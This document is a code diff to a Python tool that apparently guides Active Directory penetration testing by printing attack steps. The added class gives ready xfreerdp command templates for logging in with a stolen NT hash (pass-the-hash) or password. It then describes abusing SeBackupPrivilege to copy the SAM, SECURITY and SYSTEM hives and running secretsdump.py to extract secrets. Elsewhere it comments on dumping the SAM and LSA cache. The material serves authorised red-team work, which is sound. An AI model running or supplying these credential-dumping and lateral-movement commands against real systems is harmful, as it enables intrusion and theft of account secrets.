@@ -47,7 +47,7 @@ class x__TransformPasswordToAES(Action):
 class  x__Secretsdump(Action):
     def print(previous_action:str, glob:dict, parent:Owned, target:LDAPObject, require:dict):
         v = vars(glob, parent, target,
-                    plain=f'{Fore.RED}PLAIN_PASSWORD_HEX{Style.RESET_ALL}')
+                plain=f'{Fore.RED}PLAIN_PASSWORD_HEX{Style.RESET_ALL}')
 
         comment = "Dump the SAM and LSA cache on {target.name} to get the plain_password_hex"
 
@@ -954,7 +954,6 @@ class x_RegBackup(Action):
     def print(previous_action:str, glob:dict, parent:Owned, target:LDAPObject, require:dict):
         v = vars(glob, parent, target,
             ip=f'{Fore.RED}YOUR_IP{Style.RESET_ALL}',
-            target_ip=f'{Fore.RED}TARGET_IP{Style.RESET_ALL}',
             plain=f'{Fore.RED}PLAIN_PASSWORD_HEX{Style.RESET_ALL}')
 
         comment = "Find an accessible share or create yours:"
@@ -988,3 +987,28 @@ class x_BlankPassword(Action):
     def print(previous_action:str, glob:dict, parent:Owned, target:LDAPObject, require:dict):
         v = vars(glob, parent, target)
         print_comment("The password of {target.name} may be blank... or not", v)
+
+
+class x_CanRDP_SeBackupPrivilege_LATFP_or_RDP_required(Action):
+    def print(previous_action:str, glob:dict, parent:Owned, target:LDAPObject, require:dict):
+        v = vars(glob, parent, target)
+
+        comment = [
+            '- Connect to RDP (if opened) as {parent} on {target}',
+            '- open a cmd.exe, run as administrator',
+            '- whoami /priv: you will see the SeBackupPrivilege (even if it\'s writtent disabled)',
+            '- retrieve SAM, SECURITY, SYSTEM',
+        ]
+
+        if parent.krb_auth or parent.secret_type == c.SECRET_AESKEY:
+            cmd = "xfreerdp KRB TODO"
+        elif parent.secret_type == c.SECRET_NTHASH:
+            cmd = "xfreerdp /d:{fqdn} /u:{parent} /pth:{parent.secret} /v:{target_ip}"
+        elif parent.secret_type == c.SECRET_PASSWORD:
+            cmd = "xfreerdp /d:{fqdn} /u:{parent} /p:{parent.secret} /v:{target_ip}"
+
+        print_line(comment, cmd, v)
+
+        comment = "Extract secrets"
+        cmd = "secretsdump.py -sam SAM.save -security SECURITY.save -system SYSTEM.save local"
+        print_line(comment, cmd, v)
